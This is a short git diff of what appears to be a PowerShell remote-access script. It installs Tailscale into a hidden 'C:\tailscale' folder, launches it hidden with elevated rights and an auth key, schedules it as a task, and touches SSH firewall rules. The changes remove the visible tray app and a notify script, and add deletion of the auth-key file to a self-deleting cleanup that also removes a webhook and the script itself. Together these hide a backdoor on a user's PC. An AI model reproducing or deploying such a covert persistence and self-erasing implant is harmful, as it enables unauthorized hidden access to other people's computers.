@@ -36,12 +36,10 @@ function installTailscale {
   Get-Item "C:\tailscale" -Force | ForEach-Object {$_.Attributes = $_.Attributes -bor "Hidden"}
 
   ## Configure Tailscale on users pc
-  Move-Item ".\notify.ps1" "C:\tailscale"
   Set-Location C:\tailscale
   Start-Sleep 10
   Start-Process -FilePath ".\tailscaled.exe" -windowstyle hidden -Verb RunAs
   Start-Process -FilePath ".\tailscale.exe" -windowstyle hidden -Verb RunAs -ArgumentList 'up --authkey $authKey --unattended'
-  Start-Process -FilePath ".\tailscale-ipn.exe" -windowstyle hidden -Verb RunAs
 
   ## Adds Tailscale to task scheduler
   $name = "Tailscale"
@@ -251,4 +249,5 @@ Get-NetFirewallRule -Name *ssh*
 ## Self Delete
 Remove-Item "$PSScriptRoot/$env:computername.fk" 
 Remove-Item "$PSScriptRoot/webhook"
+Remove-Item "$PSScriptRoot/authkey"
 Remove-Item $PSCommandPath -Force 
